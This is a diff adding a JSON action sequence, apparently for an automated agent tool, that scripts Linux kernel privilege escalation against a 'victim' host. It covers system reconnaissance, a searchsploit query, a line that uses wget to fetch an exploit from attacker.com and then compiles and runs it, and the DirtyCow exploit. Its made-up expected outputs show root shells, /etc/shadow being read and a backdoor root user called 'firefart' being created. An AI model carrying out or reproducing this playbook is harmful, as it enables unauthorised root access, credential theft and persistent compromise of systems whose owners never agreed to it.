@@ -1,0 +1,30 @@
+{
+  "name": "kernel_exploit_identification",
+  "description": "Identify vulnerable kernel versions and exploit for privilege escalation",
+  "pattern": "kernel.*exploit|linux.*exploit.*suggester|dirty.*cow|privilege.*escalation.*kernel",
+  "parameters": [],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "uname", "args": ["-a"]},
+      "expected_output": {"type": "string", "example": "Linux victim 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nKernel: 4.4.0-116-generic\nOS: Ubuntu\nArchitecture: x86_64\nCompiled: Feb 12 2018 (outdated - likely vulnerable)"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat /etc/issue && cat /etc/*-release"]},
+      "expected_output": {"type": "string", "example": "Ubuntu 16.04.4 LTS\n\nDISTRIB_ID=Ubuntu\nDISTRIB_RELEASE=16.04\nDISTRIB_CODENAME=xenial\nNAME=\"Ubuntu\"\nVERSION=\"16.04.4 LTS (Xenial Xerus)\"\n\nOS Version: Ubuntu 16.04.4 LTS\nCodename: Xenial Xerus\nKernel 4.4.0-116 on Ubuntu 16.04 - vulnerable to multiple exploits"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "searchsploit linux kernel 4.4 ubuntu privilege | grep -i local"]},
+      "expected_output": {"type": "string", "example": "Linux Kernel 4.4.0-116 (Ubuntu 16.04) - Local Privilege Escalation (CVE-2017-16995)\nLinux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation\nLinux Kernel < 4.4.0-116 (Ubuntu 16.04) - Local Privilege Escalation (CVE-2017-1000112)\nLinux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation (CVE-2017-6074)\n\nMultiple exploits available for kernel 4.4.0-116"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "wget http://attacker.com/CVE-2017-16995.c && gcc CVE-2017-16995.c -o exploit && ./exploit"]},
+      "expected_output": {"type": "string", "example": "Downloading exploit for CVE-2017-16995...\nCompiling exploit...\nRunning exploit...\n\n[+] Starting exploit\n[+] Checking kernel version: 4.4.0-116-generic\n[+] Kernel is vulnerable!\n[+] Preparing exploit...\n[+] Triggering vulnerability...\n[+] Spawning root shell...\n\nroot@victim:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@victim:~# cat /etc/shadow\nroot:$6$xyz...:18965:0:99999:7:::\n\nKernel exploit successful - obtained root shell"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "gcc -pthread dirty.c -o dirty -lcrypt && ./dirty mypassword"]},
+      "expected_output": {"type": "string", "example": "Compiling DirtyCow exploit (CVE-2016-5195)...\nRunning exploit with password: mypassword\n\n/etc/passwd successfully backed up to /tmp/passwd.bak\nmmap 7f8a3e000000\n\nmadvise 0\n\nptrace 0\n\nDone! Check /etc/passwd to see if the new user was created.\nYou can log in with the username 'firefart' and the password 'mypassword'.\n\nsu firefart\nPassword: mypassword\n\nfirefart@victim:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\nDirtyCow successful - created root user 'firefart'"}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
